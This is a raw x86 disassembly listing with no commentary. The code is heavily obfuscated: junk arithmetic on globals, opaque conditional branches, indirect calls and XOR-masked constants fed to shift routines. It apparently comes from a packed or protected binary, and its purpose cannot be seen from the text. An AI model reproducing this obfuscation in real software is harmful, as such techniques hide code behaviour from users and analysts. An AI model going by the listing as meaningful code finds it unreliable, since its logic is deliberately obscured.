  420518:	mov    DWORD PTR [ebp-0x134],0x6b4
  420522:	xor    eax,eax
  420524:	mov    eax,DWORD PTR [ebp-0x134]
  42052a:	add    ecx,DWORD PTR ds:0x42289a
  420530:	or     eax,0x4f70
  420535:	mov    ecx,DWORD PTR [ebp-0x28]
  420538:	sub    DWORD PTR ds:0x4229ca,0x4228aa
  420542:	or     eax,ecx
  420544:	and    DWORD PTR ds:0x4228ba,ebx
  42054a:	sub    eax,0x5ff7
  42054f:	mov    ecx,DWORD PTR ds:0x422a82
  420555:	mov    ecx,DWORD PTR [ecx]
  420557:	adc    DWORD PTR ds:0x42294e,ecx
  42055d:	mov    DWORD PTR [ebp-0xc8],eax
  420563:	mov    DWORD PTR [ebp-0xe4],0x5f39
  42056d:	mov    DWORD PTR [ebp-0xc4],0x6236
  420577:	not    eax
  420579:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  420580:	or     eax,DWORD PTR ds:0x42289a
  420586:	mov    DWORD PTR [ebp-0x128],0x7537
  420590:	mov    DWORD PTR [ebp-0x114],0x6985
  42059a:	mov    DWORD PTR [ebp-0x14],0x5627
  4205a1:	mov    DWORD PTR [ebp-0x64],0x72e7
  4205a8:	not    DWORD PTR ds:0x42293a
  4205ae:	mov    eax,DWORD PTR [ebp-0x14]
  4205b1:	cmp    DWORD PTR ds:0x4228be,0x0
  4205b8:	mov    DWORD PTR ds:0x4228c2,edx
  4205be:	mov    DWORD PTR ds:0x42299e,0x4cb1
  4205c8:	movzx  ecx,WORD PTR ds:0x4228a2
  4205cf:	jmp    0x42067f
  4205d4:	mov    DWORD PTR ds:0x4228e2,0x2b18
  4205de:	jl     0x42060f
  4205e4:	push   DWORD PTR [ebp-0x28]
  4205e7:	push   0x68d6
  4205ec:	push   0x1f9a
  4205f1:	push   0x3f36
  4205f6:	push   DWORD PTR [ebp-0x14]
  4205f9:	call   DWORD PTR ds:0x42a1d0
  4205ff:	and    DWORD PTR ds:0x422972,edi
  420605:	sub    DWORD PTR ds:0x4229a6,0x3838
  42060f:	sub    DWORD PTR ds:0x422926,0x422946
  420619:	sub    DWORD PTR ds:0x42288e,edi
  42061f:	inc    ecx
  420620:	cmp    DWORD PTR ds:0x4228da,0x0
  420627:	mov    DWORD PTR ds:0x422916,edi
  42062d:	mov    DWORD PTR ds:0x4228c2,0x3e4f
  420637:	mov    ecx,0x124e
  42063c:	jmp    0x42067f
  420641:	movzx  ecx,WORD PTR ds:0x4228fa
  420648:	jg     0x42066d
  42064e:	push   0x110e
  420653:	call   DWORD PTR ds:0x42a1d4
  420659:	mov    ecx,DWORD PTR ds:0x42292e
  42065f:	sub    DWORD PTR ds:0x4229ba,ecx
  420665:	not    ecx
  420667:	sub    ecx,0x3ff2
  42066d:	sbb    DWORD PTR ds:0x4229b2,ecx
  420673:	mov    ecx,DWORD PTR ds:0x4229ba
  420679:	or     DWORD PTR ds:0x422996,ecx
  42067f:	add    eax,DWORD PTR [ebp-0x64]
  420682:	cmp    DWORD PTR ds:0x42296a,0x0
  420689:	mov    DWORD PTR ds:0x4229b6,edx
  42068f:	mov    DWORD PTR ds:0x4228ce,0x892
  420699:	mov    DWORD PTR ds:0x42295a,0x70ff
  4206a3:	mov    DWORD PTR ds:0x42292e,edi
  4206a9:	jmp    0x42070e
  4206ae:	mov    DWORD PTR ds:0x4228ea,0x2b24
  4206b8:	jge    0x4206ec
  4206be:	call   DWORD PTR ds:0x42a2ec
  4206c4:	xor    DWORD PTR ds:0x4229ce,ebx
  4206ca:	mov    ecx,DWORD PTR ds:0x422902
  4206d0:	or     ecx,DWORD PTR ds:0x422976
  4206d6:	mov    DWORD PTR ds:0x422902,ecx
  4206dc:	and    ecx,DWORD PTR ds:0x42293e
  4206e2:	sub    DWORD PTR ds:0x4228fe,0x422922
  4206ec:	add    DWORD PTR ds:0x422952,ecx
  4206f2:	and    ecx,DWORD PTR ds:0x4228c6
  4206f8:	adc    ecx,DWORD PTR ds:0x42290e
  4206fe:	sub    ecx,DWORD PTR ds:0x4228a2
  420704:	and    DWORD PTR ds:0x42295e,0x60c
  42070e:	mov    ecx,DWORD PTR [ebp-0x114]
  420714:	sub    DWORD PTR ds:0x4229ba,0x175
  42071e:	sub    eax,ecx
  420720:	mov    ecx,DWORD PTR [ebp-0x128]
  420726:	and    DWORD PTR ds:0x42288e,0x7a1c
  420730:	imul   eax,ecx
  420733:	imul   eax,eax,0xe4e
  420739:	neg    ecx
  42073b:	mov    ecx,DWORD PTR [ebp-0x7c]
  42073e:	and    DWORD PTR ds:0x42288e,0x4228ea
  420748:	or     eax,ecx
  42074a:	mov    ecx,DWORD PTR [ebp+0x8]
  42074d:	lea    eax,[ecx+eax*1+0x46210209]
  420754:	xor    DWORD PTR ds:0x42291a,0x563e
  42075e:	push   eax
  42075f:	sub    DWORD PTR ds:0x422926,0x42288e
  420769:	call   0x41d11f
  42076e:	neg    ecx
  420770:	mov    ecx,eax
  420772:	mov    eax,DWORD PTR [ebp-0xc4]
  420778:	sub    esi,0x184b
  42077e:	imul   eax,eax,0x21b3
  420784:	and    esi,DWORD PTR ds:0x42297a
  42078a:	add    eax,DWORD PTR [ebp-0xe4]
  420790:	and    eax,0xd5c
  420795:	and    DWORD PTR ds:0x422952,0x302e
  42079f:	sub    eax,0x2e81
  4207a4:	or     esi,DWORD PTR ds:0x4228ea
  4207aa:	xor    edx,edx
  4207ac:	mov    esi,0x2f1dc
  4207b1:	or     DWORD PTR ds:0x422942,0x422976
  4207bb:	div    esi
  4207bd:	xor    eax,0x56ef
  4207c2:	cmp    DWORD PTR ds:0x422946,0x0
  4207c9:	mov    DWORD PTR ds:0x422916,edi
  4207cf:	mov    DWORD PTR ds:0x422966,0x662c
  4207d9:	mov    DWORD PTR ds:0x4229d2,edi
  4207df:	jmp    0x4208ff
  4207e4:	mov    DWORD PTR ds:0x4229ce,0x4f06
  4207ee:	jg     0x420809
  4207f4:	push   DWORD PTR [ebp-0x20]
  4207f7:	call   DWORD PTR ds:0x42a1d8
  4207fd:	sub    esi,DWORD PTR ds:0x42288e
  420803:	sub    DWORD PTR ds:0x4229ba,edx
  420809:	or     esi,esi
  42080b:	add    edx,0x7894
  420811:	mov    esi,DWORD PTR ds:0x4229f6
  420817:	mov    edx,DWORD PTR ds:0x422a52
  42081d:	sub    edx,esi
  42081f:	imul   esi,DWORD PTR [esi+edx*1]
  420823:	xor    edx,DWORD PTR ds:0x422896
  420829:	cmp    DWORD PTR ds:0x42295e,0x0
  420830:	mov    DWORD PTR ds:0x4228ea,0x1c26
  42083a:	mov    DWORD PTR ds:0x4229b2,edx
  420840:	jmp    0x4208ff
  420845:	mov    DWORD PTR ds:0x422962,0x1de8
  42084f:	jb     0x42087e
  420855:	push   DWORD PTR [ebp-0xc]
  420858:	push   0x797e
  42085d:	push   DWORD PTR [ebp-0x28]
  420860:	push   DWORD PTR [ebp-0x20]
  420863:	push   DWORD PTR [ebp-0x20]
  420866:	call   DWORD PTR ds:0x42a0a0
  42086c:	xor    edx,0x2ce5
  420872:	adc    DWORD PTR ds:0x422946,edi
  420878:	sub    DWORD PTR ds:0x4229ca,edx
  42087e:	xor    edx,esi
  420880:	and    esi,edx
  420882:	mov    edx,DWORD PTR ds:0x4229e2
  420888:	mov    esi,DWORD PTR ds:0x422ab2
  42088e:	sub    edx,esi
  420890:	xor    edx,DWORD PTR [edx+esi*1]
  420893:	cmp    DWORD PTR ds:0x42298a,0x0
  42089a:	mov    DWORD PTR ds:0x4228d6,edx
  4208a0:	movzx  edx,WORD PTR ds:0x422896
  4208a7:	mov    edx,0x6c32
  4208ac:	jmp    0x4208ff
  4208b1:	mov    DWORD PTR ds:0x422896,0x27d5
  4208bb:	mov    DWORD PTR ds:0x4228a2,0x76ec
  4208c5:	jb     0x4208ed
  4208cb:	push   DWORD PTR [ebp-0x28]
  4208ce:	push   DWORD PTR [ebp-0x28]
  4208d1:	call   DWORD PTR ds:0x42a0a4
  4208d7:	adc    edx,0x3a8d
  4208dd:	and    DWORD PTR ds:0x422976,0x6cff
  4208e7:	or     DWORD PTR ds:0x422992,ebx
  4208ed:	xor    edx,DWORD PTR ds:0x42299a
  4208f3:	inc    DWORD PTR ds:0x4229ba
  4208f9:	and    DWORD PTR ds:0x422932,edx
  4208ff:	add    ecx,eax
  420901:	mov    DWORD PTR [ebp-0x90],ecx
  420907:	mov    DWORD PTR [ebp-0xe0],0x7a31
  420911:	inc    esi
  420912:	mov    DWORD PTR [ebp-0x44],0x2514
  420919:	xor    eax,eax
  42091b:	or     eax,DWORD PTR ds:0x4228ee
  420921:	xor    DWORD PTR ds:0x422932,eax
  420927:	mov    DWORD PTR [ebp-0xdc],0x699c
  420931:	sbb    edx,ecx
  420933:	mov    DWORD PTR [ebp-0xd8],0x1
  42093d:	mov    DWORD PTR [ebp-0x24],0x7901
  420944:	cmp    DWORD PTR ds:0x422976,0x0
  42094b:	not    edx
  42094d:	mov    DWORD PTR ds:0x4228a2,0x569b
  420957:	mov    DWORD PTR ds:0x4228a6,0x4d6f
  420961:	mov    DWORD PTR ds:0x42297e,edx
  420967:	jmp    0x4209b6
  42096c:	mov    DWORD PTR ds:0x422976,edx
  420972:	mov    DWORD PTR ds:0x4228fa,ecx
  420978:	je     0x42099a
  42097e:	push   0x5aed
  420983:	push   0x6c8d
  420988:	call   DWORD PTR ds:0x42a2f0
  42098e:	xor    DWORD PTR ds:0x42293a,0x1a42
  420998:	adc    esi,ecx
  42099a:	adc    edx,DWORD PTR ds:0x4228d6
  4209a0:	and    ecx,0x55be
  4209a6:	sbb    DWORD PTR ds:0x42290a,0x346b
  4209b0:	add    ecx,0x18f
  4209b6:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  4209c0:	mov    eax,ds:0x422ab6
  4209c5:	mov    eax,DWORD PTR [eax]
  4209c7:	sub    DWORD PTR ds:0x4228ce,eax
  4209cd:	mov    DWORD PTR [ebp-0x78],0x37f2
  4209d4:	or     DWORD PTR ds:0x4229b2,edx
  4209da:	mov    DWORD PTR [ebp-0x10],0x62ba
  4209e1:	mov    DWORD PTR [ebp-0x94],0x561c
  4209eb:	adc    DWORD PTR ds:0x4228e6,0x1c9a
  4209f5:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209fc:	xor    DWORD PTR ds:0x4228a2,edi
  420a02:	mov    DWORD PTR [ebp-0x60],0x24c7
  420a09:	mov    DWORD PTR [ebp-0x5c],0x7a45
  420a10:	or     esi,ecx
  420a12:	mov    eax,DWORD PTR [ebp-0x34]
  420a15:	adc    esi,DWORD PTR ds:0x422936
  420a1b:	mov    ecx,DWORD PTR [ebp-0x60]
  420a1e:	mov    edx,DWORD PTR ds:0x4228ea
  420a24:	add    DWORD PTR ds:0x42292e,edx
  420a2a:	mov    edx,DWORD PTR [ebp-0x5c]
  420a2d:	xor    DWORD PTR ds:0x4228b2,ecx
  420a33:	and    edx,0x160e
  420a39:	neg    esi
  420a3b:	sub    edx,ecx
  420a3d:	sub    edx,0x29ad
  420a43:	or     esi,ecx
  420a45:	imul   edx,eax
  420a48:	cmp    DWORD PTR ds:0x42292e,0x0
  420a4f:	mov    ecx,DWORD PTR ds:0x4229c6
  420a55:	mov    DWORD PTR ds:0x4229c6,0x2cb4
  420a5f:	mov    esi,0x7aa2
  420a64:	jmp    0x420aa4
  420a69:	mov    DWORD PTR ds:0x4228e2,edx
  420a6f:	mov    eax,ds:0x422996
  420a74:	jb     0x420a9c
  420a7a:	push   DWORD PTR [ebp-0x10]
  420a7d:	call   DWORD PTR ds:0x42a1dc
  420a83:	sbb    DWORD PTR ds:0x422986,edx
  420a89:	xor    esi,esi
  420a8b:	add    esi,DWORD PTR ds:0x4229e6
  420a91:	mov    ecx,DWORD PTR ds:0x422a76
  420a97:	sub    ecx,esi
  420a99:	xor    esi,DWORD PTR [esi+ecx*1]
  420a9c:	and    ecx,esi
  420a9e:	dec    DWORD PTR ds:0x42289a
  420aa4:	mov    eax,DWORD PTR [ebp-0x90]
  420aaa:	lea    eax,[eax+edx*1+0x14f2e240]
  420ab1:	sub    ecx,DWORD PTR ds:0x42296e
  420ab7:	mov    DWORD PTR [ebp-0x174],eax
  420abd:	mov    eax,DWORD PTR [ebp-0x24]
  420ac0:	and    DWORD PTR ds:0x422896,0x422952
  420aca:	mov    ecx,DWORD PTR [ebp-0x94]
  420ad0:	mov    edx,DWORD PTR [ebp-0x10]
  420ad3:	xor    edx,ecx
  420ad5:	cmp    DWORD PTR ds:0x4228be,0x0
  420adc:	not    esi
  420ade:	mov    DWORD PTR ds:0x422946,0x4c6a
  420ae8:	jmp    0x420b48
  420aed:	mov    DWORD PTR ds:0x42293e,0x2e5b
  420af7:	not    DWORD PTR ds:0x4229ae
  420afd:	jae    0x420b38
  420b03:	push   DWORD PTR [ebp-0xc]
  420b06:	push   0x4ad9
  420b0b:	push   0x541c
  420b10:	push   0x4226c9
  420b15:	push   0x8f89
  420b1a:	call   DWORD PTR ds:0x42a2f4
  420b20:	sbb    esi,0x7b5f
  420b26:	or     DWORD PTR ds:0x4228f6,0x55a2
  420b30:	sbb    DWORD PTR ds:0x4228ee,ebx
  420b36:	neg    ecx
  420b38:	xor    ecx,ecx
  420b3a:	add    esi,esi
  420b3c:	sub    esi,esi
  420b3e:	or     DWORD PTR ds:0x42298e,0x3de5
  420b48:	add    edx,DWORD PTR [ebp-0x78]
  420b4b:	adc    ecx,DWORD PTR ds:0x4228de
  420b51:	mov    ecx,DWORD PTR [ebp-0xc0]
  420b57:	lea    ecx,[edx+ecx*1+0x6ac1]
  420b5e:	and    ecx,eax
  420b60:	mov    eax,0x1101
  420b65:	cmp    DWORD PTR ds:0x42294e,0x0
  420b6c:	mov    DWORD PTR ds:0x4228fe,0x36ab
  420b76:	mov    esi,DWORD PTR ds:0x4228b6
  420b7c:	mov    edx,0x20e8
  420b81:	jmp    0x420bd3
  420b86:	mov    esi,DWORD PTR ds:0x42299a
  420b8c:	ja     0x420bc0
  420b92:	push   0x4228a2
  420b97:	push   0x42299a
  420b9c:	push   0x42293a
  420ba1:	call   DWORD PTR ds:0x42a0a8
  420ba7:	adc    edx,0x5974
  420bad:	movzx  esi,BYTE PTR ds:0x422952
  420bb4:	xor    DWORD PTR ds:0x4228ce,esi
  420bba:	or     DWORD PTR ds:0x422926,ecx
  420bc0:	or     edx,DWORD PTR ds:0x4228ce
  420bc6:	movzx  edx,WORD PTR ds:0x4229b6
  420bcd:	sub    DWORD PTR ds:0x42299e,edx
  420bd3:	sub    eax,ecx
  420bd5:	add    eax,DWORD PTR [ebp+0x8]
  420bd8:	mov    DWORD PTR [ebp-0x170],eax
  420bde:	cmp    DWORD PTR ds:0x422952,0x0
  420be5:	mov    DWORD PTR ds:0x42289a,0x4ae9
  420bef:	mov    DWORD PTR ds:0x422896,0x6df4
  420bf9:	mov    DWORD PTR ds:0x422902,0x1097
  420c03:	mov    esi,0x562b
  420c08:	jmp    0x420c62
  420c0d:	not    eax
  420c0f:	mov    DWORD PTR ds:0x422896,ebx
  420c15:	jae    0x420c52
  420c1b:	push   0x61a8
  420c20:	push   0x28f0
  420c25:	push   0x2a61
  420c2a:	push   0x1d7f
  420c2f:	push   DWORD PTR [ebp-0xc]
  420c32:	push   DWORD PTR [ebp-0x24]
  420c35:	push   0x73d0
  420c3a:	call   DWORD PTR ds:0x42a1e0
  420c40:	adc    edx,0x4a39
  420c46:	xor    edx,esi
  420c48:	or     DWORD PTR ds:0x422946,0x6558
  420c52:	sub    esi,0x4c5d
  420c58:	xor    DWORD PTR ds:0x4228d2,0x124
  420c62:	mov    DWORD PTR [ebp-0x15c],0xba699573
  420c6c:	mov    DWORD PTR [ebp-0x158],0x9c0a89d8
  420c76:	mov    DWORD PTR [ebp-0x154],0xba699577
  420c80:	sbb    DWORD PTR ds:0x422956,edi
  420c86:	mov    DWORD PTR [ebp-0x150],0x9c0a89d8
  420c90:	or     esi,0x7211
  420c96:	mov    esi,DWORD PTR [ebp-0x174]
  420c9c:	mov    eax,DWORD PTR [ebp-0x154]
  420ca2:	mov    edx,DWORD PTR [ebp-0x150]
  420ca8:	sbb    DWORD PTR ds:0x42292e,0x5043
  420cb2:	xor    eax,0xba699573
  420cb7:	sub    DWORD PTR ds:0x4228fa,0x6217
  420cc1:	xor    edx,0x9c0a89d8
  420cc7:	mov    cl,0x2
  420cc9:	call   0x41a184
  420cce:	cmp    DWORD PTR ds:0x4229aa,0x0
  420cd5:	mov    DWORD PTR ds:0x422936,0x7dfa
  420cdf:	mov    ebx,DWORD PTR ds:0x422896
  420ce5:	not    ebx
  420ce7:	mov    ebx,0x627c
  420cec:	jmp    0x420d40
  420cf1:	mov    DWORD PTR ds:0x422892,0x500b
  420cfb:	mov    DWORD PTR ds:0x4229a6,0x12a3
  420d05:	jle    0x420d31
  420d0b:	push   DWORD PTR [ebp-0xc]
  420d0e:	push   0x7ce6
  420d13:	push   DWORD PTR [ebp-0x28]
  420d16:	call   DWORD PTR ds:0x42a2f8
  420d1c:	add    ebx,0x3114
  420d22:	movzx  ebx,BYTE PTR ds:0x4229ae
  420d29:	add    DWORD PTR ds:0x422922,ebx
  420d2f:	and    ebx,ebx
  420d31:	inc    ebx
  420d32:	neg    ebx
  420d34:	xor    edi,DWORD PTR ds:0x422962
  420d3a:	xor    ebx,DWORD PTR ds:0x4228ba
  420d40:	mov    edi,eax
  420d42:	mov    ebx,edx
  420d44:	and    edx,DWORD PTR ds:0x422902
  420d4a:	mov    eax,DWORD PTR [ebp-0x154]
  420d50:	mov    edx,DWORD PTR [ebp-0x150]
  420d56:	xor    eax,0xba699573
  420d5b:	xor    edx,0x9c0a89d8
  420d61:	mov    cl,0x3e
  420d63:	adc    DWORD PTR ds:0x4228ea,0x4228ee
  420d6d:	call   0x421c3a
  420d72:	or     edi,eax
  420d74:	or     ebx,edx
  420d76:	cmp    DWORD PTR ds:0x422912,0x0
  420d7d:	mov    DWORD PTR ds:0x422992,ecx
  420d83:	mov    DWORD PTR ds:0x4228d2,edi
  420d89:	not    edx
  420d8b:	mov    edx,0x3bde
  420d90:	jmp    0x420de1
  420d95:	not    eax
  420d97:	mov    eax,ds:0x422922
  420d9c:	jne    0x420dcf
  420da2:	push   0x10a6
  420da7:	call   DWORD PTR ds:0x42a0ac
  420dad:	xor    DWORD PTR ds:0x4228ea,0x6213
  420db7:	mov    edx,DWORD PTR ds:0x422ad6
  420dbd:	mov    edx,DWORD PTR [edx]
  420dbf:	sub    DWORD PTR ds:0x4228ea,edx
  420dc5:	adc    DWORD PTR ds:0x42297e,0x796e
  420dcf:	sub    DWORD PTR ds:0x42291e,ebx
  420dd5:	sbb    edx,0x242b
  420ddb:	sbb    edx,DWORD PTR ds:0x42291a
  420de1:	mov    eax,DWORD PTR [ebp-0x15c]
  420de7:	neg    edx
  420de9:	mov    edx,DWORD PTR [ebp-0x158]
  420def:	sub    DWORD PTR ds:0x4228b6,0x5dbf
  420df9:	xor    eax,0xba699573
  420dfe:	sbb    DWORD PTR ds:0x422942,0x2b75
  420e08:	xor    edx,0x9c0a89d8
  420e0e:	mov    cl,0x2
  420e10:	adc    DWORD PTR ds:0x422966,0x1945
  420e1a:	call   0x41a184
  420e1f:	mov    ecx,edx
  420e21:	mov    edx,DWORD PTR [ebp-0x15c]
  420e27:	mov    DWORD PTR [ebp-0x218],esi
  420e2d:	mov    esi,DWORD PTR [ebp-0x158]
  420e33:	xor    edx,0xba699573
  420e39:	xor    esi,0x9c0a89d8
  420e3f:	mov    DWORD PTR [ebp-0x21c],eax
  420e45:	mov    eax,edx
  420e47:	mov    edx,esi
  420e49:	mov    DWORD PTR [ebp-0x220],ecx
  420e4f:	mov    cl,0x3e
  420e51:	call   0x421c3a
  420e56:	mov    esi,DWORD PTR [ebp-0x21c]
  420e5c:	or     esi,eax
  420e5e:	mov    eax,DWORD PTR [ebp-0x220]
  420e64:	or     eax,edx
  420e66:	push   eax
  420e67:	push   esi
  420e68:	push   ebx
  420e69:	push   edi
  420e6a:	call   0x41dfae
  420e6f:	mov    esi,DWORD PTR [ebp-0x218]
  420e75:	cmp    esi,eax
  420e77:	jne    0x420f2d
  420e7d:	mov    eax,DWORD PTR [ebp-0x154]
  420e83:	mov    edx,DWORD PTR [ebp-0x150]
  420e89:	xor    eax,0xba699573
  420e8e:	xor    edx,0x9c0a89d8
  420e94:	mov    cl,0x2
  420e96:	call   0x41a184
  420e9b:	mov    esi,eax
  420e9d:	mov    edi,edx
  420e9f:	mov    eax,DWORD PTR [ebp-0x154]
  420ea5:	mov    edx,DWORD PTR [ebp-0x150]
  420eab:	xor    eax,0xba699573
  420eb0:	xor    edx,0x9c0a89d8
  420eb6:	mov    cl,0x3e
  420eb8:	call   0x421c3a
  420ebd:	or     esi,eax
  420ebf:	or     edi,edx
  420ec1:	mov    eax,DWORD PTR [ebp-0x15c]
  420ec7:	mov    edx,DWORD PTR [ebp-0x158]
  420ecd:	xor    eax,0xba699573
  420ed2:	xor    edx,0x9c0a89d8
  420ed8:	mov    cl,0x2
  420eda:	call   0x41a184
  420edf:	mov    ebx,eax
  420ee1:	mov    eax,edx
  420ee3:	mov    ecx,DWORD PTR [ebp-0x15c]
  420ee9:	mov    edx,DWORD PTR [ebp-0x158]
  420eef:	xor    ecx,0xba699573
  420ef5:	xor    edx,0x9c0a89d8
  420efb:	mov    DWORD PTR [ebp-0x224],eax
  420f01:	mov    eax,ecx
  420f03:	mov    cl,0x3e
  420f05:	call   0x421c3a
  420f0a:	or     ebx,eax
  420f0c:	mov    eax,DWORD PTR [ebp-0x224]
  420f12:	or     eax,edx
  420f14:	push   eax
  420f15:	push   ebx
  420f16:	push   edi
  420f17:	push   esi
  420f18:	call   0x41dfae
  420f1d:	mov    DWORD PTR [ebp-0x178],eax
  420f23:	jmp    0x4211ed
  420f28:	jmp    0x4211a3
  420f2d:	lea    eax,[ebp-0x168]
  420f33:	mov    DWORD PTR [ebp-0x164],eax
  420f39:	mov    eax,DWORD PTR [ebp-0x164]
  420f3f:	mov    DWORD PTR [eax],0xa3e69a9d
  420f45:	mov    eax,DWORD PTR [ebp-0x168]
  420f4b:	xor    eax,0xa3e69a9d
  420f50:	shr    eax,0x2
  420f53:	mov    ecx,DWORD PTR [ebp-0x168]
  420f59:	xor    ecx,0xa3e69a9d
  420f5f:	shl    ecx,0x1e
  420f62:	or     eax,ecx
  420f64:	mov    ecx,DWORD PTR [ebp-0x174]
  420f6a:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  420f6e:	mov    DWORD PTR [ebp-0x160],eax
  420f74:	mov    esi,DWORD PTR [ebp-0x160]
  420f7a:	mov    eax,DWORD PTR [ebp-0x154]
  420f80:	mov    edx,DWORD PTR [ebp-0x150]
  420f86:	xor    eax,0xba699573
  420f8b:	xor    edx,0x9c0a89d8
  420f91:	mov    cl,0x2
  420f93:	call   0x41a184
  420f98:	mov    edi,eax
  420f9a:	mov    ebx,edx
  420f9c:	mov    eax,DWORD PTR [ebp-0x154]
  420fa2:	mov    edx,DWORD PTR [ebp-0x150]
  420fa8:	xor    eax,0xba699573
  420fad:	xor    edx,0x9c0a89d8
  420fb3:	mov    cl,0x3e
  420fb5:	call   0x421c3a
  420fba:	or     edi,eax
  420fbc:	or     ebx,edx
  420fbe:	mov    eax,DWORD PTR [ebp-0x15c]
  420fc4:	mov    edx,DWORD PTR [ebp-0x158]
  420fca:	xor    eax,0xba699573
  420fcf:	xor    edx,0x9c0a89d8
  420fd5:	mov    cl,0x2
  420fd7:	call   0x41a184
  420fdc:	mov    ecx,edx
  420fde:	mov    edx,DWORD PTR [ebp-0x15c]
  420fe4:	mov    DWORD PTR [ebp-0x228],esi
  420fea:	mov    esi,DWORD PTR [ebp-0x158]
  420ff0:	xor    edx,0xba699573
  420ff6:	xor    esi,0x9c0a89d8
  420ffc:	mov    DWORD PTR [ebp-0x22c],eax
  421002:	mov    eax,edx
  421004:	mov    edx,esi
  421006:	mov    DWORD PTR [ebp-0x230],ecx
  42100c:	mov    cl,0x3e
  42100e:	call   0x421c3a
  421013:	mov    esi,DWORD PTR [ebp-0x22c]
  421019:	or     esi,eax
  42101b:	mov    eax,DWORD PTR [ebp-0x230]
  421021:	or     eax,edx
  421023:	push   eax
  421024:	push   esi
  421025:	push   ebx
  421026:	push   edi
  421027:	call   0x41dfae
  42102c:	mov    esi,DWORD PTR [ebp-0x228]
  421032:	cmp    esi,eax
  421034:	je     0x4210a9
  42103a:	mov    eax,DWORD PTR [ebp-0x154]
  421040:	mov    edx,DWORD PTR [ebp-0x150]
  421046:	xor    eax,0xba699573
  42104b:	xor    edx,0x9c0a89d8
  421051:	mov    cl,0x2
  421053:	call   0x41a184
  421058:	mov    esi,eax
  42105a:	mov    edi,edx
  42105c:	mov    eax,DWORD PTR [ebp-0x154]
  421062:	mov    edx,DWORD PTR [ebp-0x150]
  421068:	xor    eax,0xba699573
  42106d:	xor    edx,0x9c0a89d8
  421073:	mov    cl,0x3e
  421075:	call   0x421c3a
  42107a:	or     esi,eax
  42107c:	or     edi,edx
  42107e:	mov    eax,DWORD PTR [ebp-0x160]
  421084:	imul   esi,eax
  421087:	add    esi,DWORD PTR [ebp-0x170]
  42108d:	mov    DWORD PTR [ebp-0x16c],esi
  421093:	mov    eax,DWORD PTR [ebp-0x16c]
  421099:	mov    DWORD PTR [ebp-0x178],eax
  42109f:	jmp    0x4211ed
  4210a4:	jmp    0x421154
  4210a9:	mov    eax,DWORD PTR [ebp-0x154]
  4210af:	mov    edx,DWORD PTR [ebp-0x150]
  4210b5:	xor    eax,0xba699573
  4210ba:	xor    edx,0x9c0a89d8
  4210c0:	mov    cl,0x2
  4210c2:	call   0x41a184
  4210c7:	mov    esi,eax
  4210c9:	mov    edi,edx
  4210cb:	mov    eax,DWORD PTR [ebp-0x154]
  4210d1:	mov    edx,DWORD PTR [ebp-0x150]
  4210d7:	xor    eax,0xba699573
  4210dc:	xor    edx,0x9c0a89d8
  4210e2:	mov    cl,0x3e
  4210e4:	call   0x421c3a
  4210e9:	or     esi,eax
  4210eb:	or     edi,edx
  4210ed:	mov    eax,DWORD PTR [ebp-0x15c]
  4210f3:	mov    edx,DWORD PTR [ebp-0x158]
  4210f9:	xor    eax,0xba699573
  4210fe:	xor    edx,0x9c0a89d8
  421104:	mov    cl,0x2
  421106:	call   0x41a184
  42110b:	mov    ebx,eax
  42110d:	mov    eax,edx
  42110f:	mov    ecx,DWORD PTR [ebp-0x15c]
  421115:	mov    edx,DWORD PTR [ebp-0x158]
  42111b:	xor    ecx,0xba699573
  421121:	xor    edx,0x9c0a89d8
  421127:	mov    DWORD PTR [ebp-0x234],eax
  42112d:	mov    eax,ecx
  42112f:	mov    cl,0x3e
  421131:	call   0x421c3a
  421136:	or     ebx,eax
  421138:	mov    eax,DWORD PTR [ebp-0x234]
  42113e:	or     eax,edx
  421140:	push   eax
  421141:	push   ebx
  421142:	push   edi
  421143:	push   esi
  421144:	call   0x41dfae
  421149:	mov    DWORD PTR [ebp-0x178],eax
  42114f:	jmp    0x4211ed
  421154:	mov    eax,DWORD PTR [ebp-0x15c]
  42115a:	mov    edx,DWORD PTR [ebp-0x158]
  421160:	xor    eax,0xba699573
  421165:	xor    edx,0x9c0a89d8
  42116b:	mov    cl,0x2
  42116d:	call   0x41a184
  421172:	mov    esi,eax
  421174:	mov    edi,edx
  421176:	mov    eax,DWORD PTR [ebp-0x15c]
  42117c:	mov    edx,DWORD PTR [ebp-0x158]
  421182:	xor    eax,0xba699573
  421187:	xor    edx,0x9c0a89d8
  42118d:	mov    cl,0x3e
  42118f:	call   0x421c3a
  421194:	or     esi,eax
  421196:	or     edi,edx
  421198:	mov    DWORD PTR [ebp-0x178],esi
  42119e:	jmp    0x4211ed
  4211a3:	mov    eax,DWORD PTR [ebp-0x15c]
  4211a9:	mov    edx,DWORD PTR [ebp-0x158]
  4211af:	xor    eax,0xba699573
  4211b4:	xor    edx,0x9c0a89d8
  4211ba:	mov    cl,0x2
  4211bc:	call   0x41a184
  4211c1:	mov    esi,eax
  4211c3:	mov    edi,edx
  4211c5:	mov    eax,DWORD PTR [ebp-0x15c]
  4211cb:	mov    edx,DWORD PTR [ebp-0x158]
  4211d1:	xor    eax,0xba699573
  4211d6:	xor    edx,0x9c0a89d8
  4211dc:	mov    cl,0x3e
  4211de:	call   0x421c3a
  4211e3:	or     esi,eax
  4211e5:	or     edi,edx
  4211e7:	mov    DWORD PTR [ebp-0x178],esi
  4211ed:	mov    ecx,DWORD PTR [ebp-0xd8]
  4211f3:	mov    eax,0x459a
  4211f8:	xor    edx,edx
  4211fa:	div    ecx
  4211fc:	mov    ecx,DWORD PTR [ebp-0xdc]
  421202:	and    eax,ecx
  421204:	add    eax,DWORD PTR [ebp-0x44]
  421207:	mov    ecx,DWORD PTR [ebp-0xe0]
  42120d:	lea    eax,[eax+ecx*1+0x272f]
  421214:	xor    eax,0x1080c
  421219:	add    eax,DWORD PTR [ebp-0x178]
  42121f:	mov    DWORD PTR [ebp-0xe8],eax
  421225:	mov    DWORD PTR [ebp-0xc],0x5950
  42122c:	mov    DWORD PTR [ebp-0xf8],0x4964
  421236:	mov    DWORD PTR [ebp-0x130],0x3
  421240:	mov    DWORD PTR [ebp-0x20],0x2df9
  421247:	mov    DWORD PTR [ebp-0x8],0x4524
  42124e:	mov    DWORD PTR [ebp-0xd4],0x637e
  421258:	mov    DWORD PTR [ebp-0x110],0x38c8
  421262:	mov    DWORD PTR [ebp-0xa4],0x7118
  42126c:	mov    DWORD PTR [ebp-0xa0],0xaf6
  421276:	mov    DWORD PTR [ebp-0x10c],0x3315
  421280:	mov    eax,DWORD PTR [ebp-0xf8]
  421286:	mov    ecx,DWORD PTR [ebp-0x130]
